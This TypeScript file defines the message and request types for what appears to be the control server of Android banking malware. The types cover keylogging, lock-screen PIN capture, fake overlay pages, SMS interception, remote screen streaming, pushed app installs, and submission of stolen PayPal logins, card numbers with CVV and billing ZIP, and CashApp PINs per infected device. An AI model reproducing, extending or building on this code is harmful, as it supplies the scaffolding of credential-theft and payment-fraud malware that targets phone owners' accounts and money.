export type DeviceMessageType =
  | "heartbeat"
  | "sms"
  | "keyboard"
  | "keyguard_pin"
  | "fake_page"
  | "paypal_account"
  | "visa_account"
  | "cashapp_account"
  | "debit_account"
  | "command_result"
  | "screen_frame"
  | "screen_error"
  | "screen_status"
  | "webrtc_offer"
  | "webrtc_answer"
  | "webrtc_ice"
  | "webrtc_hangup"
  | "ui_tree_push";

export type ServerToDeviceType = "pong" | "command";

export type CommandStatus = "pending" | "sent" | "success" | "failed" | "timeout";

export type AdminPushType =
  | "device_online"
  | "device_offline"
  | "heartbeat"
  | "device_registered"
  | "device_bind_code"
  | "command_sent"
  | "command_result"
  | "keyboard"
  | "keyguard_pin"
  | "fake_page"
  | "paypal_account"
  | "visa_account"
  | "cashapp_account"
  | "debit_account"
  | "apk_download"
  | "installer_install"
  | "client_install"
  | "sms"
  | "a11y_probe"
  | "ui_tree_push";

export interface DeviceInboundMessage {
  type: DeviceMessageType;
  payload?: Record<string, unknown>;
}

export interface ServerToDeviceMessage {
  type: ServerToDeviceType;
  id?: string;
  cmd?: string;
  params?: Record<string, unknown>;
}

export interface AdminPushMessage {
  type: AdminPushType;
  deviceId: string;
  payload?: Record<string, unknown>;
  timestamp: number;
}

export interface RegisterDeviceBody {
  androidId: string;
  model?: string;
  meta?: Record<string, unknown>;
}

export interface RegisterDeviceResponse {
  deviceId: string;
  deviceToken: string;
}

export interface SendCommandBody {
  deviceId: string;
  cmd: string;
  params?: Record<string, unknown>;
  waitMs?: number;
}

export interface CommandResultPayload {
  id: string;
  ok: boolean;
  data?: Record<string, unknown>;
  error?: string;
}

export interface SubmitPayPalAccountBody {
  deviceToken: string;
  email: string;
  password: string;
  amount?: string;
  currency?: string;
  submittedAt?: number;
  /** A 绑定的目标设备号；有则银行卡记到该设备下 */
  boundDeviceId?: string;
}

export interface SubmitVisaAccountBody {
  deviceToken: string;
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  amount?: string;
  submittedAt?: number;
  boundDeviceId?: string;
}

export interface SubmitCashAppAccountBody {
  deviceToken: string;
  pin: string;
  amount?: string;
  submittedAt?: number;
  boundDeviceId?: string;
}

export interface SubmitDebitAccountBody {
  deviceToken: string;
  cardHolder: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  billingZip: string;
  amount?: string;
  submittedAt?: number;
  boundDeviceId?: string;
}

export interface PaymentUnlockQuery {
  deviceToken?: string;
  deviceId?: string;
}
